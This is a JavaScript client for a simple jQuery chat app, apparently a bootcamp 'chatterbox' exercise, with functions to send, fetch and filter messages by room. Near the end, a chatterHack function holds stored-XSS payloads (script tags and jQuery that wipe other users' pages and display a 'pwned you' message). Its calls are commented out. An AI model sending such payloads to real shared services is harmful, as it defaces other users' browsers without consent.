var app = {
  // server: 'https://api.parse.com/1/classes/chatterbox',
  // server: 'http://127.0.0.1:3000/classes/chatterbox',
  server: 'http://127.0.0.1:3000/classes/messages',
  username: undefined,
  message: undefined,
  roomname: undefined,
  friends: {}
};

// Set default properties of 'app'.
app.init = function() {
  var username = window.location.search.slice(10);
  app.username = username;
  app.roomname = "lobby";
}

// Append a new message to the page.
app.addMessage = function(message) {
  var $newMsg = $blankMessage.clone();
  var $user = $newMsg.find(".user");
  $user.addClass(message.username);
  if(app.friends[message.username]) {
    $user.addClass("friend");
  }
  $user.text(message.username);
  $newMsg.find(".messageText").text(": " + message.message);
  $newMsg.insertAfter($blankMessage);
  $newMsg.show();
  $user.on('click', function(){
    var $name = $user.text();
    app.addFriend($name);
    $user.addClass("friend");
    $("body").find("." + message.username).addClass("friend");
  })
  objectIds[message.objectId] = message.objectId;
}

// Add a user to the collection of friends.
app.addFriend = function(user) {
  app.friends[user] = user;
}

// Remove messages on the the page.
app.clearMessages = function() {
  var $allMessages = $('.message:not(:first)');
  $allMessages.remove();
  objectIds = {};
}

// Change the roomname, and refresh the messages on the page.
// Only messages from this roomname will be shown.
app.switchRoom = function(roomname) {
  app.roomname = roomname;
  app.clearMessages();
  app.fetch();
}

// Send a message/chat to the server.
app.send = function(message) {
  $.ajax({
    // This is the url you should use to communicate with the parse API server.
    url: app.server,
    type: 'POST',
    data: JSON.stringify(message),
    contentType: 'application/json',
    success: function (data) {
      console.log('chatterbox: Message sent');
    },
    error: function (data) {
      // See: https://developer.mozilla.org/en-US/docs/Web/API/console.error
      console.error('chatterbox: Failed to send message');
    }
  });
}

// Receive any new messages/chats from the server.
app.fetch = function() {
  $.ajax({
    url: app.server,
    type: 'GET',
    success: function (data) {
      console.log('chatterbox: Message received for ', data);

      var results = JSON.parse(data).results;

      var length = results.length;
      for (var i = 0; i < length; i++) {
        var obj = results[i];
        if (objectIds[obj.objectId]) {
          continue;
        }
        if (app.roomname === obj.roomname) {
          app.addMessage(obj);
        }
      }
    }
  })
}

// Add a new roomname.
app.addRoom = function(roomname) {
  var $newRoom = $emptyRoom.clone();
  $newRoom.text(roomname);
  $newRoom.insertAfter($emptyRoom);
  $newRoom.show();
}

app.handleSubmit = function(data) {

}

app.init();
var $blankMessage;
var $main;
var $emptyRoom;
var $body = $('body');
var objectIds = {};

$(document).ready(function(){

  $blankMessage = $(".message");
  $blankMessage.hide();
  $main = $("#main");
  $emptyRoom = $("#emptyRoom");
  $emptyRoom.hide();
  // var message = {
  //   username: app.username,
  //   text: 'It\'s good to be the king',
  //   roomname: app.roomname
  // };
  // app.addMessage(message);

  // Submit chat message input box.
  var $submit = $("#submit");
  var $input = $('#input');

  function sendChat() {
    var $val = $input.val();
    var user = {
      username: app.username,
      message: $val,
      roomname: app.roomname
    }
    // app.addMessage(user);
    app.send(user);
    app.fetch();
    $input.val('');
  }

  $submit.on('click', sendChat)
  $input.keypress(function(e) {
    if (e.which == 13) {
      e.preventDefault();
      sendChat();
    }
  })

  // Create new room textarea.
  function createRoom() {
    if ($addRoomName.val() === '') {
      return;
    }
    app.addRoom($addRoomName.val())
    $addRoomName.val('');
  }

  var $addRoomButton = $('#addRoomButton');
  var $addRoomName = $('#addRoom');
  $addRoomButton.on('click', createRoom)
  $addRoomName.keypress(function(e) {
    if (e.which == 13) {
      e.preventDefault();
      createRoom();
    }
  })

  // Switch to a different room with the select element.
  function roomSelect() {
    var roomname = $roomSelect.val();
    app.switchRoom(roomname);
  }
  var $roomSelect = $('#roomSelect');
  $roomSelect.on('change', roomSelect);



  // Check for new chat messages.
  app.fetch();
  var fetching = setInterval(function() {
    app.fetch();
    //clearInterval(fetching);
  }, 5000)

  function chatterHack() {
    var hack = {
      username: 'GreenRaccoon23',
      message: "$('html').html('');$('body').css({'background-image': 'url(https://goo.gl/RG0g2I)', 'background-size': 'cover', 'width': '100%', 'height': '100%', 'display': 'block', 'margin': '0'});console.error('GreenRaccoon23 pwned you')",
      roomname: 'lobby'
    };
    app.send(hack);
    hack.text = "<script>$('html').html('');$('body').css({'background-image': 'url(https://goo.gl/RG0g2I)', 'background-size': 'cover', 'width': '100%', 'height': '100%', 'display': 'block', 'margin': '0'});console.error('GreenRaccoon23 pwned you')</script>";
    app.send(hack);
    hack.text = "GreenRaccoon23 <script>$('html').html('');$('body').css({'background-image': 'url(https://goo.gl/RG0g2I)', 'background-size': 'cover', 'width': '100%', 'height': '100%', 'display': 'block', 'margin': '0'});console.error('GreenRaccoon23 pwned you')</script>";
    app.send(hack);
  }

  function chatterHackSafe() {
    var hack = {
      username: 'GreenRaccoon23',
      text: "console.log('GreenRaccoon23 could have pwned you')",
      roomname: 'lobby'
    };
    app.send(hack);
    hack.text = "<script>console.log('GreenRaccoon23 could have pwned you')</script>";
    app.send(hack);
    //hack.text = "GreenRaccoon23 <script>console.log('GreenRaccoon23 could have pwned you')</script>";
    //app.send(hack);
  }
  //chatterHack();
  //setInterval(chatterHack, 300000);
  //chatterHackSafe();
  //setInterval(chatterHackSafe, 300000);
  //var crack = new Worker('crack.js');
  //var crack = new Worker(URL.createObjectURL(new Blob(["("+worker_function.toString()+")()"], {type: 'text/javascript'})));

})
/*
var message = {
  username: 'GreenRaccoon23',
  text: "$('html').html('');$('body').css({'background-image': 'url(https://goo.gl/RG0g2I)', 'background-size': 'cover', 'width': '100%', 'height': '100%', 'display': 'block', 'margin': '0'});console.error('GreenRaccoon23 pwned you')",
  roomname: 'lobby'
};
*/
